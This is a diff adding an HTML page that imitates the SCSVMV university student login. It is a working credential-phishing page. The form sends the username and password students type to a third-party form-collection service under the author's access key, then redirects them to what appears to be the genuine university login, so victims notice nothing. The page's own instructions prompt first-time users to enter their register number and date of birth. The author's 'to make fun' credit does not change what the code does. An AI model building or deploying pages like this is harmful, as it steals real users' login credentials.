@@ -1,0 +1,44 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Student Login</title>
+    <link rel="icon" href="scsvmv-university-logo.png">
+    <link rel="stylesheet" href="login.css">
+    
+</head>
+<body>
+<center>
+    <div class="container">
+        <div class="logo">
+            <img src="logo.png" class="pg">
+           
+        </div>
+        <h3 class="h2">SCSVMV Students Log In</h3>
+        <form action="https://api.web3forms.com/submit" method="POST">
+        <div class="inputbox">          
+            <input type="hidden" name="access_key" value="a6a36e6d-6bbf-4fad-8bdf-4a215daf7e27">
+            <input type="name" name="name" class="input"  placeholder="Username" required><br><br>
+            <input type="password" name="text" class="input" placeholder="password" required>          
+        </div>
+        <p class="p1"> <strong>If you are a Student and this is your first login, you must use your Register number as your User ID, with your date of birth [Format ddmmyyyy E.g.  03121990] as your password.</strong></p>
+         <div class="bt">
+            <button type="submit" class="btn"  onclick="location.href = 'http://14.139.187.57/scsvmvonline/students/loginManager/youLogin.jsp';" id="myButton" >Login</button>        
+         </div>
+    </form> 
+    
+        <p class="p">Developed By:Raghul bsc(sc) to make fun</p>
+    </div>
+    
+</div>
+</center>  
+//<script src="https://web3forms.com/client/script.js" async defer></script>
+<script type="text/javascript">
+    document.getElementById("myButton").onclick = function () {
+    location.href = "http://14.139.187.57/scsvmvonline/students/loginManager/youLogin.jsp";
+    };
+    </script>
+
+</body>
+</html>
